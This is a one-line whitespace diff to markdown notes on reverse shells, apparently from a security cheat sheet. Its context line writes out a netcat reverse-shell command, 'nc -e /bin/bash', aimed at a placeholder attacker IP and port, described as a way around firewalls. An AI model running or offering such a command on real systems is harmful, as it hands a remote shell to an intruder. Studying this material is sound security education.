@@ -65,7 +65,7 @@ Reverse shells are a good way to bypass firewalls. The drawback is that we need 
 
  > 
  > **<font color=red>nc -e /bin/bash</font> \[ATTACKER_IP\] \[ATTACKER_PORT\]**<br>
- > Reverse shell. 
+ > Reverse shell.
 
 ---
 
